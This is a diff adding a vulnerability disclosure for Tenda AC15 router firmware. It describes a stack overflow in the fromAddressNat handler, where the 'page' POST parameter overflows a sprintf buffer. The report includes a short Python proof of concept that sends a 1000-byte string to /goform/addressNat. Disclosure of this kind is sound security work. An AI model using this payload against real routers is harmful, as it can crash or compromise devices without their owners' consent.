@@ -1,0 +1,30 @@
+## Overview
+
+- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html
+
+## Affected version
+
+AC15V1.0 V15.03.20_multi
+
+## Vulnerability details
+
+The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `fromAddressNat` function. The `v7` variable receives the `page` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `page` can trigger this security vulnerability.
+
+![image-20240314180934697](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314180934697.png)
+
+## POC
+
+```python
+import requests
+from pwn import*
+
+ip = "192.168.84.101"
+url = "http://" + ip + "/goform/addressNat"
+payload = b"a"*1000
+
+data = {"page": payload}
+response = requests.post(url, data=data)
+print(response.text)
+```
+
+![image-20240314180825277](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314180825277.png)
